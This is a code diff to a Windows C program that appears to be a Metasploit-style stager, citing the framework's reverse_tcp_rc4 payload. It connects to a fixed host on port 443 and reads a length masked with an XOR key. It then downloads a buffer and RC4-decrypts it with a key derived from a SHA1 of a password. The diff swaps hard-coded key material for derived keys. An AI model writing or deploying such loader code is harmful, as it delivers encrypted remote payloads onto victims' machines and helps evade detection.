@@ -2,6 +2,11 @@
 #include <windows.h>
 
 #include "rc4.h"
+#include "sha1.h"
+
+#define HOST "1.1.1.1"
+#define PORT "443"
+#define RC4PASS "pass"
 
 static SOCKET WSOCKET;
 
@@ -33,11 +38,20 @@ static long recv_all(SOCKET s, char *buf, long len) {
 
 static char *download(long *rawSize) {
   ws_init();
-  WSOCKET = ws_connect("1.1.1.1", "443");
+  WSOCKET = ws_connect(HOST, PORT);
+
+  char key[SHA1_DIGEST_SIZE + 1];
+  key[SHA1_DIGEST_SIZE] = 0;
+  sha1_buffer(RC4PASS, strlen(RC4PASS), key);
+  char *rc4key = key + 4;
+  int xorkey = 0;
+  for (int i = 0; i < 4; i++) {
+    xorkey ^= key[i] << i * 8;
+  }
 
   long size;
   recv(WSOCKET, (char *)&size, 4, 0);
-  size = size & 0xFFFFFFFF ^ 0x642e4744;
+  size ^= xorkey;
 
   *rawSize = size + 5;
   char *buf = (char *)malloc(*rawSize);
@@ -48,9 +62,7 @@ static char *download(long *rawSize) {
 
   recv_all(WSOCKET, buf + 5, size);
 
-  char key[] =
-      "\x3f\x45\x1c\xae\x2b\xa0\x46\x0e\x45\x13\x85\xf0\xff\x31\x48\x2f";
-  RC4(key, buf + 5, size);
+  RC4(rc4key, buf + 5, size);
 
   return buf;
 }
@@ -66,3 +78,7 @@ int main() {
 
   return 0;
 }
+
+/*
+https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/payload/windows/x64/reverse_tcp_rc4.rb
+*/
